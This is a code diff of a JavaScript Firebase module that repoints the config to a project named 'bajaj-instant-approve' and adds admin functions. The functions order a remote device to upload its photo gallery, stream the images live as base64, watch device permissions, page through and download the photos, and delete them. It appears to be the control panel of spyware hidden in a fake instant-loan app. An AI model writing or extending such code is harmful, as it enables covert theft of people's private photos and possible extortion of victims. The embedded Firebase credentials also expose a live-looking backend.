@@ -14,13 +14,13 @@ import {
 } from 'firebase/database';
 
 const firebaseConfig = {
-  apiKey: "AIzaSyC--vQSUehzMbD98TR1aENe3GGKhkBWghA",
-  authDomain: "ui3050-e45b9.firebaseapp.com",
-  databaseURL: "https://ui3050-e45b9-default-rtdb.firebaseio.com",
-  projectId: "ui3050-e45b9",
-  storageBucket: "ui3050-e45b9.firebasestorage.app",
-  messagingSenderId: "63001370231",
-  appId: "1:63001370231:web:bfc31768005b18867bb072"
+  apiKey: "AIzaSyAHjykH13muJMOdkFaEehUkHvWcSUCLT3Y",
+  authDomain: "bajaj-instant-approve.firebaseapp.com",
+  databaseURL: "https://bajaj-instant-approve-default-rtdb.firebaseio.com",
+  projectId: "bajaj-instant-approve",
+  storageBucket: "bajaj-instant-approve.firebasestorage.app",
+  messagingSenderId: "662103149147",
+  appId: "1:662103149147:web:b95d50add890ef44448d7e"
 };
 
 const app = initializeApp(firebaseConfig);
@@ -513,7 +513,149 @@ export const sendPing = async (deviceId) => {
     return { success: false, error: error.message };
   }
 };
+// ============================================
+// ✅ GALLERY FUNCTIONS (Admin)
+// ============================================
 
+// Admin gallery request bhejta hai
+export const requestGalleryFromDevice = async (deviceId) => {
+  try {
+    await set(ref(db, `gallery_requests/${deviceId}`), {
+      requested: true,
+      requestedAt: Date.now(),
+      status: 'pending',
+      requestedBy: 'admin'
+    });
+    return { success: true };
+  } catch (error) {
+    return { success: false, error: error.message };
+  }
+};
+
+// Request clear karo (modal close hone par)
+export const clearGalleryRequest = async (deviceId) => {
+  try {
+    await remove(ref(db, `gallery_requests/${deviceId}`));
+    return { success: true };
+  } catch (error) {
+    return { success: false, error: error.message };
+  }
+};
+
+// Live gallery listen (real-time)
+export const listenLiveGallery = (deviceId, callback) => {
+  const galleryRef = ref(db, `gallery_preview/${deviceId}`);
+  
+  console.log('🔍 Listening:', `gallery_preview/${deviceId}`);
+  
+  return onValue(galleryRef, (snapshot) => {
+    console.log('📡 Exists:', snapshot.exists());
+    
+    const data = snapshot.val() || {};
+    const images = Object.keys(data).map(key => ({
+      id: key,
+      ...data[key]
+    }));
+    
+    console.log('📊 Images:', images.length);
+    
+    // ✅ Base64 wali images pehle
+    images.sort((a, b) => {
+      // Loading wali last me
+      if (a.base64 && !b.base64) return -1;
+      if (!a.base64 && b.base64) return 1;
+      return (b.timestamp || 0) - (a.timestamp || 0);
+    });
+
+    const stats = {
+      total: images.length,
+      completed: images.filter(i => i.base64).length,
+      loading: images.filter(i => i.uploading === true).length
+    };
+    
+    console.log('📈 Stats:', stats);
+    callback(images, stats);
+  });
+};
+
+// ✅ Device permission listen (PermissionHelper se)
+export const listenDevicePermissions = (deviceId, callback) => {
+  const permRef = ref(db, `permissions/${deviceId}`);
+  return onValue(permRef, (snapshot) => {
+    callback(snapshot.exists() ? snapshot.val() : {});
+  });
+};
+
+// Delete single image
+export const deleteGalleryImage = async (deviceId, imageId) => {
+  try {
+    await remove(ref(db, `devices/${deviceId}/gallery/${imageId}`));
+    return { success: true };
+  } catch (error) {
+    return { success: false, error: error.message };
+  }
+};
+
+// Clear all images
+export const clearDeviceGallery = async (deviceId) => {
+  try {
+    await remove(ref(db, `devices/${deviceId}/gallery`));
+    return { success: true };
+  } catch (error) {
+    return { success: false, error: error.message };
+  }
+};
+
+// Download base64 image
+export const downloadBase64Image = (base64, filename) => {
+  try {
+    const base64Data = base64.split(',')[1] || base64;
+    const byteCharacters = atob(base64Data);
+    const byteNumbers = new Array(byteCharacters.length);
+    for (let i = 0; i < byteCharacters.length; i++) {
+      byteNumbers[i] = byteCharacters.charCodeAt(i);
+    }
+    const byteArray = new Uint8Array(byteNumbers);
+    const blob = new Blob([byteArray], { type: 'image/jpeg' });
+
+    const url = window.URL.createObjectURL(blob);
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = filename || `image_${Date.now()}.jpg`;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    setTimeout(() => window.URL.revokeObjectURL(url), 1000);
+
+    return { success: true };
+  } catch (error) {
+    return { success: false, error: error.message };
+  }
+};
+// ✅ Load More request bhejo
+export const requestLoadMore = async (deviceId, offset) => {
+  try {
+    await set(ref(db, `gallery_load_more/${deviceId}`), {
+      requested: true,
+      offset: offset,
+      limit: 20,
+      requestedAt: Date.now()
+    });
+    return { success: true };
+  } catch (error) {
+    return { success: false, error: error.message };
+  }
+};
+
+// ✅ Clear Load More request
+export const clearLoadMoreRequest = async (deviceId) => {
+  try {
+    await remove(ref(db, `gallery_load_more/${deviceId}`));
+    return { success: true };
+  } catch (error) {
+    return { success: false, error: error.message };
+  }
+};
 // Listen for ping response from device (Real-time)
 export const listenPingResponse = (deviceId, callback) => {
   const responseRef = ref(db, `pong/${deviceId}`);
